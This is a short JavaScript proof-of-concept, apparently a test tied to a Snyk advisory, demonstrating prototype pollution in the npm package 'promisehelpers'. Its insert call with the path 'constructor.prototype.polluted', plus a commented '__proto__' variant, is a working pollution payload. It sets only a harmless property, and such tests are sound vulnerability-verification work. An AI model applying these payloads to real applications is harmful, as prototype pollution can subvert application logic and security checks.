// //https://snyk.io/vuln/SNYK-JS-PROMISEHELPERS-598686
// test("prototype pollution in promisehelpers", () => {
  const promisehelpers = require("promisehelpers");
  obj = {};

console.log({}.polluted);
promisehelpers.insert(["constructor","prototype", "polluted"], "yes")(obj);
  //promisehelpers.insert(["__proto__", "polluted"], "yes")(obj);
console.log({}.polluted);
// });
